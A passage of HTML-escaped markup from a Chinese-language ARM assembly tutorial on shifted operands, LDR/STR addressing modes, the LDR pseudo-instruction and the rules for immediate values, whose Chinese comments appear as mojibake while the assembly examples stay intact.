&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx, LSR n - å¯¹å¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œé€»è¾‘å³ç§»nä½åçš„å€¼
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx, ROR n - å¯¹å¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œå¾ªç¯å³ç§»nä½åçš„å€¼
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx, RRX - å¯¹å¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œå¸¦æ‰©å±•çš„å¾ªç¯å³ç§»1ä½åçš„å€¼
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">ADD R0, R1, R2 - å°†ç¬¬ä¸€æ“ä½œæ•°R1çš„å†…å®¹ä¸ç¬¬äºŒæ“ä½œæ•°R2çš„å†…å®¹ç›¸åŠ ï¼Œå°†ç»“æœå­˜å‚¨åˆ°R0ä¸­ã€‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ADD R0, R1, #2 - å°†ç¬¬ä¸€æ“ä½œæ•°R1çš„å†…å®¹ä¸ç¬¬äºŒæ“ä½œæ•°ä¸€ä¸ªç«‹å³æ•°ç›¸åŠ ï¼Œå°†ç»“æœå­˜åˆ°R0ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MOVLE R0, #5 - å½“æ»¡è¶³æ¡ä»¶LE(Less and Equal,å°äºç­‰äº0)å°†ç¬¬äºŒæ“ä½œæ•°ç«‹å³æ•°5ç§»åŠ¨åˆ°R0ä¸­,æ³¨æ„è¿™æ¡æŒ‡ä»¤ä¸MOVLE R0, R0, #5ç›¸åŒ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MOV R0, R1, LSL #1 - å°†ç¬¬äºŒæ“ä½œæ•°R1å¯„å­˜å™¨ä¸­çš„å€¼é€»è¾‘å·¦ç§»1ä½åå­˜å…¥R0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810144732.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="å†…å­˜è®¿é—®ç›¸å…³æŒ‡ä»¤">å†…å­˜è®¿é—®ç›¸å…³æŒ‡ä»¤&lt;/h3>
&lt;p>é€šå¸¸ï¼ŒLDRè¢«ç”¨æ¥ä»å†…å­˜ä¸­åŠ è½½æ•°æ®åˆ°å¯„å­˜å™¨ï¼ŒSTRè¢«ç”¨ä½œå°†å¯„å­˜å™¨çš„å€¼å­˜æ”¾åˆ°å†…å­˜ä¸­ã€‚&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810145231.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>ä¾‹å­ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.data /* æ•°æ®æ®µæ˜¯åœ¨å†…å­˜ä¸­åŠ¨æ€åˆ›å»ºçš„ï¼Œæ‰€ä»¥å®ƒçš„åœ¨å†…å­˜ä¸­çš„åœ°å€ä¸å¯é¢„æµ‹*/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var1: .word 3 /* å†…å­˜ä¸­çš„ç¬¬ä¸€ä¸ªå˜é‡ */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var2: .word 4 /* å†…å­˜ä¸­çš„ç¬¬äºŒä¸ªå˜é‡ */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.text /* ä»£ç æ®µå¼€å§‹ */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r0, adr_var1 @ å°†å­˜æ”¾var1å€¼çš„åœ°å€adr_var1åŠ è½½åˆ°å¯„å­˜å™¨R0ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, adr_var2 @ å°†å­˜æ”¾var2å€¼çš„åœ°å€adr_var2åŠ è½½åˆ°å¯„å­˜å™¨R1ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r2, [r0] @ å°†R0æ‰€æŒ‡å‘åœ°å€ä¸­å­˜æ”¾çš„0x3åŠ è½½åˆ°å¯„å­˜å™¨R2ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1] @ å°†R2ä¸­çš„å€¼0x3å­˜æ”¾åˆ°R1åšæŒ‡å‘çš„åœ°å€
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bkpt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var1: .word var1 /* var1çš„åœ°å€åŠ©è®°ç¬¦ */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var2: .word var2 /* var2çš„åœ°å€åŠ©è®°ç¬¦ */
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810145711.gif"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810154906.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ç¬¬ä¸€ç§åç§»å½¢å¼ï¼šç«‹å³æ•°ä½œåç§»&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">STR Ra, [Rb, imm]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LDR Ra, [Rc, imm]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.data
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var1: .word 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var2: .word 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r0, adr_var1 @ å°†å­˜æ”¾var1å€¼çš„åœ°å€adr_var1åŠ è½½åˆ°å¯„å­˜å™¨R0ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, adr_var2 @ å°†å­˜æ”¾var2å€¼çš„åœ°å€adr_var2åŠ è½½åˆ°å¯„å­˜å™¨R1ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r2, [r0] @ å°†R0æ‰€æŒ‡å‘åœ°å€ä¸­å­˜æ”¾çš„0x3åŠ è½½åˆ°å¯„å­˜å™¨R2ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, #2] @ å–å€æ¨¡å¼ï¼šåŸºäºåç§»é‡ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ 2æ‰€æŒ‡å‘åœ°å€å¤„ã€‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, #4]! @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•å‰ç½®ä¿®æ”¹ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ 4æ‰€æŒ‡å‘åœ°å€å¤„ï¼Œä¹‹åR1å¯„å­˜å™¨ä¸­å­˜å‚¨çš„å€¼åŠ 4,ä¹Ÿå°±æ˜¯R1=R1+4ã€‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r3, [r1], #4 @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•åç½®ä¿®æ”¹ã€‚R3å¯„å­˜å™¨ä¸­çš„å€¼æ˜¯ä»R1å¯„å­˜å™¨çš„å€¼æ‰€æŒ‡å‘çš„åœ°å€ä¸­åŠ è½½çš„ï¼ŒåŠ è½½ä¹‹åR1å¯„å­˜å™¨ä¸­å­˜å‚¨çš„å€¼åŠ 4,ä¹Ÿå°±æ˜¯R1=R1+4ã€‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bkpt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var1: .word var1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var2: .word var2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810160844.gif"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>ç¬¬äºŒç§åç§»å½¢å¼ï¼šå¯„å­˜å™¨ä½œåç§»&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">STR Ra, [Rb, Rc]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LDR Ra, [Rb, Rc]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.data
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var1: .word 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var2: .word 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r0, adr_var1 @ å°†å­˜æ”¾var1å€¼çš„åœ°å€adr_var1åŠ è½½åˆ°å¯„å­˜å™¨R0ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, adr_var2 @ å°†å­˜æ”¾var2å€¼çš„åœ°å€adr_var2åŠ è½½åˆ°å¯„å­˜å™¨R1ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r2, [r0] @ å°†R0æ‰€æŒ‡å‘åœ°å€ä¸­å­˜æ”¾çš„0x3åŠ è½½åˆ°å¯„å­˜å™¨R2ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, r2] @ å–å€æ¨¡å¼ï¼šåŸºäºåç§»é‡ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ R2å¯„å­˜å™¨çš„å€¼æ‰€æŒ‡å‘åœ°å€å¤„ã€‚R1å¯„å­˜å™¨ä¸ä¼šè¢«ä¿®æ”¹ã€‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, r2]! @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•å‰ç½®ä¿®æ”¹ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ R2å¯„å­˜å™¨çš„å€¼æ‰€æŒ‡å‘åœ°å€å¤„ï¼Œä¹‹åR1å¯„å­˜å™¨ä¸­çš„å€¼è¢«æ›´æ–°,ä¹Ÿå°±æ˜¯R1=R1+R2ã€‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r3, [r1], r2 @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•åç½®ä¿®æ”¹ã€‚R3å¯„å­˜å™¨ä¸­çš„å€¼æ˜¯ä»R1å¯„å­˜å™¨çš„å€¼æ‰€æŒ‡å‘çš„åœ°å€ä¸­åŠ è½½çš„ï¼ŒåŠ è½½ä¹‹åR1å¯„å­˜å™¨ä¸­çš„å€¼è¢«æ›´æ–°ä¹Ÿå°±æ˜¯R1=R1+R2ã€‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bx lr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var1: .word var1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810162217.gif"
loading="lazy"
alt="img"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ç¬¬ä¸‰ç§åç§»å½¢å¼ï¼šå¯„å­˜å™¨ç¼©æ”¾å€¼ä½œåç§»&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">LDR Ra, [Rb, Rc, &amp;lt;shifter&amp;gt;]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">STR Ra, [Rb, Rc, &amp;lt;shifter&amp;gt;]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.data
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var1: .word 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var2: .word 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r0, adr_var1 @ å°†å­˜æ”¾var1å€¼çš„åœ°å€adr_var1åŠ è½½åˆ°å¯„å­˜å™¨R0ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, adr_var2 @ å°†å­˜æ”¾var2å€¼çš„åœ°å€adr_var2åŠ è½½åˆ°å¯„å­˜å™¨R1ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r2, [r0] @ å°†R0æ‰€æŒ‡å‘åœ°å€ä¸­å­˜æ”¾çš„0x3åŠ è½½åˆ°å¯„å­˜å™¨R2ä¸­
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, r2, LSL#2] @ å–å€æ¨¡å¼ï¼šåŸºäºåç§»é‡ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ (å·¦ç§»ä¸¤ä½åçš„R2å¯„å­˜å™¨çš„å€¼)æ‰€æŒ‡å‘åœ°å€å¤„ã€‚R1å¯„å­˜å™¨ä¸ä¼šè¢«ä¿®æ”¹ã€‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, r2, LSL#2]! @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•å‰ç½®ä¿®æ”¹ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ (å·¦ç§»ä¸¤ä½åçš„R2å¯„å­˜å™¨çš„å€¼)æ‰€æŒ‡å‘åœ°å€å¤„ï¼Œä¹‹åR1å¯„å­˜å™¨ä¸­çš„å€¼è¢«æ›´æ–°,ä¹Ÿå°±R1 = R1 + R2&amp;lt;&amp;lt;2ã€‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r3, [r1], r2, LSL#2 @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•åç½®ä¿®æ”¹ã€‚R3å¯„å­˜å™¨ä¸­çš„å€¼æ˜¯ä»R1å¯„å­˜å™¨çš„å€¼æ‰€æŒ‡å‘çš„åœ°å€ä¸­åŠ è½½çš„ï¼ŒåŠ è½½ä¹‹åR1å¯„å­˜å™¨ä¸­çš„å€¼è¢«æ›´æ–°ä¹Ÿå°±æ˜¯R1 = R1 + R2&amp;lt;&amp;lt;2ã€‚
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bkpt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var1: .word var1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var2: .word var2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810162414.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å¦‚ä½•åŒºåˆ†å–å€æ¨¡å¼ï¼š&lt;/p>
&lt;p>å¦‚æœæœ‰ä¸€ä¸ªå¹å·!ï¼Œé‚£å°±æ˜¯ç´¢å¼•å‰ç½®å–å€æ¨¡å¼ï¼Œå³ä½¿ç”¨è®¡ç®—åçš„åœ°å€ï¼Œä¹‹åæ›´æ–°åŸºå€å¯„å­˜å™¨ã€‚&lt;/p>
&lt;p>å¦‚æœåœ¨å¤–æœ‰ä¸€ä¸ªå¯„å­˜å™¨ï¼Œé‚£å°±æ˜¯ç´¢å¼•åç½®å–å€æ¨¡å¼ï¼Œå³ä½¿ç”¨åŸæœ‰åŸºå€å¯„å­˜å™¨é‡çš„åœ°å€ï¼Œä¹‹åå†æ›´æ–°åŸºå€å¯„å­˜å™¨&lt;/p>
&lt;p>é™¤æ­¤ä¹‹å¤–ï¼Œå°±éƒ½æ˜¯åç§»å–å€æ¨¡å¼äº†&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å…³äºPCç›¸å¯¹å–å€çš„LDRæŒ‡ä»¤&lt;/strong>&lt;/p>
&lt;p>æœ‰æ—¶å€™LDRå¹¶ä¸ä»…ä»…è¢«ç”¨æ¥ä»å†…å­˜ä¸­åŠ è½½æ•°æ®ã€‚è¿˜æœ‰å¦‚ä¸‹è¿™æ“ä½œ:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.section .text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r0, =jump /* åŠ è½½jumpæ ‡ç­¾æ‰€åœ¨çš„å†…å­˜ä½ç½®åˆ°R0 */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, =0x68DB00AD /* åŠ è½½ç«‹å³æ•°0x68DB00ADåˆ°R1 */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jump:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r2, =511 /* åŠ è½½ç«‹å³æ•°511åˆ°R2 */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bkpt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™äº›æŒ‡ä»¤å­¦æœ¯ä¸Šè¢«ç§°ä½œä¼ªæŒ‡ä»¤ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>åœ¨ARMä¸­ä½¿ç”¨ç«‹å³æ•°çš„è§„å¾‹&lt;/strong>&lt;/p>
&lt;p>åœ¨ARMä¸­ä¸èƒ½åƒX86é‚£æ ·ç›´æ¥å°†ç«‹å³æ•°åŠ è½½åˆ°å¯„å­˜å™¨ä¸­ã€‚å› ä¸ºä½ ä½¿ç”¨çš„ç«‹å³æ•°æ˜¯å—é™çš„ã€‚&lt;/p>
&lt;p>ç«‹å³æ•°çš„å€¼ï¼šv = n ror 2*r æœ‰æ•ˆçš„ç«‹å³æ•°éƒ½å¯ä»¥é€šè¿‡å¾ªç¯å³ç§»æ¥å¾—åˆ°&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">#256 // 1 å¾ªç¯å³ç§» 24ä½ --&amp;gt; 256
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#384 // 6 å¾ªç¯å³ç§» 26ä½ --&amp;gt; 384
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#484 // 121 å¾ªç¯å³ç§» 30ä½ --&amp;gt; 484
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#16384 // 1 å¾ªç¯å³ç§» 18ä½ --&amp;gt; 16384
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#2030043136 // 121 å¾ªç¯å³ç§» 8ä½ --&amp;gt; 2030043136
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#0x06000000 // 6 å¾ªç¯å³ç§» 8ä½ --&amp;gt; 100663296 (åå…­è¿›åˆ¶å€¼0x06000000)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Invalid values:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#370 // 185 å¾ªç¯å³ç§» 31ä½ --&amp;gt; 31ä¸åœ¨èŒƒå›´å†… (0 â€“ 30)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#511 // 1 1111 1111 --&amp;gt; æ¯”ç‰¹æ¨¡å‹ä¸ç¬¦åˆ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#0x06010000 // 1 1000 0001.. --&amp;gt; æ¯”ç‰¹æ¨¡å‹ä¸ç¬¦åˆ
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™æ ·å¹¶ä¸èƒ½ä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰çš„32ä½å€¼ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹çš„ä¸¤ä¸ªé€‰é¡¹æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š&lt;/p>
&lt;ul>
&lt;li>ç”¨å°éƒ¨åˆ†å»ç»„æˆæ›´å¤§çš„å€¼ã€‚Â MOV r0, #511 å°†511åˆ†æˆä¸¤éƒ¨åˆ†ï¼šMOV r0, #256, and ADD r0, #255&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
